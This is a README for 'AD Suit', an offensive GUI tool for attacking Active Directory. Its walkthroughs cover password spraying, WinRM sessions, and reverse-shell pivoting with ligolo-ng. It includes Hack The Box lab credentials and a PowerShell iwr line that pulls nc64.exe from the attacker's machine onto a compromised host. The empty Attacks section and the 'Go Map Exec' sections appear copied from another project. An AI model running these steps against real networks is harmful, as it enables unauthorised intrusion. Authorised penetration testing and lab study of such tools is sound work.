# AD Suit

# Overview

<b>ADSuit</b> is a comprehensive penetration testing suite designed for security professionals and network administrators. It focuses on enhancing the assessment of Active Directory (AD) environments, providing a wide range of tools and functionalities that streamline the process of identifying vulnerabilities, auditing AD setups, and simulating attack scenarios.

# Features

- GUI based tool.
- Hosts, domain, IPs and credentials management.
- One click to start a session with WinRM or PSexec.
- One click to start a spraying usernames and passwords agains a host with two different tools (CrackMapExec and GoMapExec).
- Pivot easly from network to network with only a reverse shell.
- Enumerate and attack active directories with one click.
  
# Installation

<b>The Tool only supports the latest version of kali at the mean time.</b>

<b>Download</b> adsuit-1.0.deb and install it with dpkg:
```
sudo dpkg -i adsuit-1.0.deb

```
To <b>uninstall</b> the tool:
```
sudo apt remove adsuit
```
# Usage
<b>Start</b> the tool with root privileges(ONLY ROOT):
```
sudo adsuit
```

 
# Step-By-Step Guide
## Hosts Tab:

Here you will input the <b>IP adresses</b> you are going to test along with the <b>domain</b> if any. Both field supports <b>auto save</b> when changes are made.

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/879b2a3c-2ac1-43f9-8ad1-3563563ac96c)

## UserManagement Tab:

In this tab, you will enter all the <b>usernames, passwords and hashes you found</b>, they are important and going to be used in the next tabs.
All the fields supports auto save when change is made.

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/64d4ccd5-b8f4-4fb8-8fd0-7dfc8e6eb6b9)

## Sessions Tab:

This tab is used to <b>start sessions</b> using the usernames, password and hashes from the UserManagement tab, when clicking connect button, new <b>terminal</b> will open with the session opened.

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/00372325-1977-427b-aee0-10796937aa71)

It supports <b>three</b> session which are:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/121c814f-39e8-4de8-b37f-f8c30eb91f97)

You can also choose between using a <b>password or a hash</b> along with the username:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/c8e9f5c3-0c4c-4e0a-8bda-5ea079f9fab5)

<b>Example</b>: here we used forest machine from hack the box, the user is "svc-alfresco" and password "s3rvice" and the session is made via WinRM:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/3accd9a4-1cc6-4361-8959-88732711c70b)

## Spraying Tab:
In this tab, two tools are used to <b>spray</b> the usernames, password and hashes to a single or multiple IPs.

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/58dcbe83-607a-41b9-83f2-8bc047dfe5ac)

Two tools are used to spray the password which are:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/8234485b-2004-47be-95d6-e2e6d62be977)

<b>Example</b>: Here we are spraying usernames agains the password using CrackMapExec with multiple IPs agains SMB protocol on forest machine from hack the box:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/f46f70b1-37bb-4101-a35b-e17db71151f8)

The attack result:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/0a2a7367-3adb-48d5-9c6e-1a9cf053ea2f)

## Pivoting Tab:
This tab is one of the <b>most important</b> tabs, its supports <b>pivoting</b> to new network via a <b>reverse shell!</b>

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/a3e11f8d-f7b9-42ed-b362-ab187c7f9dce)

This tab uses <b>ligolo-ng</b> to reach the goal, it starts proxy internally and configue it, then upload agent to the host that the reverse shell came from, all done automaticlly, just send the reverse shell!

While pentesting, you might face a host with dual interfaces, and the second interface leads you to an internal network, but you still can't access it from kali.
In this tab, you will need to enter the following information before starting the listener:
```
1: OS: The host that you are sending the reverse shell from operating system.
2: Your IP: Here you need to enter you kali linux ip.
3: Target Network: The IP address of the network that you want to pivot to.
4: Port: The port that you are going to use for listing to the reverse shell.
5: Upload Wait Time: This time is the time that you think it is enough to upload agent file to the machine that the reverse shell will come from, it depents on how fast is the connection, adjust it depending on that.
```
<b>Windows host example</b>: in this example, we hacked a windows host, then discovered that it's dual interface host, and the other interface might takes as somewhere interesting, so we need to pivot:

screenshot of the windows machine with dual interface

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/cec06bb3-61fb-46e8-948e-c2225417120a)

We will start the pivoting process with the start listing button after we entered the required information:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/c0dc1309-6773-49e1-963b-15e12e43c7bd)

the termial will look like this:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/1c1d87b8-94bd-4d9c-8a1c-66bd75272d68)

Now we will need to go to the windows machine and upload nc64.exe and send a reverse shell to our kali machine on port 4444.

as we can see below when we hit enter, AD Suit started the uploading process immediately(make sure that you can read/write on the current directory):

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/8c3f73a3-e9e8-4b13-b51a-21ee99988dba)


The reverse shell will be recieved on AD Suit:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/78411a63-e691-489e-a7d5-5b379dd3d530)

Now after waiting 60 seconds, the tunnel is build and we have connection to the new network:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/054d672b-81cb-4ee8-b37b-a9e99626061b)

We can now interact with the new network directly from our normal kali terminal, for example run ping against on of the new network hosts:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/d34a340b-cffb-4eb2-868f-f09896ea3999)


<b>Linux host example</b>:
Here we have another host, but this time the host is with Linux OS, as we can see it's also connected to the external netwok that we have access too "192.168.0.0", and we need to access the "10.0.2.0" network:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/30cb41ee-f00d-47cb-bc3a-601cc08d158f)

Here are the AD Suit configurations with listining started:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/a3ff15e2-04cc-491d-8d94-5e023c327a9e)

The terminal looks like this:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/f8fb09d4-c2d2-477b-87b9-7fc17c906362)

Now we will go to the Linux host and send the reverse shell using netcat, once we hit enter AD Suit will start uploading agent file to the host:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/1eec9898-0bc1-4906-9b9d-47bd3beb2b54)

Reverse shell recieved:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/c32f3086-4226-4387-8034-c38c41f257ed)

Upload done and we are good to access the new network:

![image](https://github.com/toneemarqus/AD-Suit/assets/85018947/91525b05-9b7e-476b-8629-06235308c3f2)

<b>For Linux, if you need to access a container on the same host, the tool will help you do that too! just put the container network ip in the interface field).</b>

### File Uploading with pivoting tab

Fot both windows and linux host examples above, a listener is added on the host that the reverse is sent from, if you are on one of the internal hosts, you will not be able to access kali directly.

To solve this problem a listener is added, to use it follow this example which will upload nc64.exe to the internal host, make sur you have python http server on port 80 on your kali:


```
iwr -uri http://10.0.2.5:1234/nc64.exe -Outfile nc64.exe

```
The above command will send the request to the dual host port "1234" that we send the reverse shell from then the host will forward it to port "80" on kali and the file will be uploaded.

## Attacks Tab:



# Contributing to Go Map Exec

I welcome contributions from everyone! Here are some ways you can contribute:

1. **Reporting Bugs**: If you find a bug, please use the Issues tab to report it, providing as much detail as possible.

2. **Feature Suggestions**: Have an idea to improve Go Map Exec? We'd love to hear it! Submit your suggestions through the Issues tab.

3. **Pull Requests**: Want to directly contribute to the code? Great! Please submit a pull request with a clear description of your changes and any necessary tests or documentation.
Thank you for your interest in improving Go Map Exec!

# Disclaimer
Go Map Exec is intended for legal purposes only. Users are responsible for complying with applicable laws. The developer is not liable for misuse or damage caused by this tool.
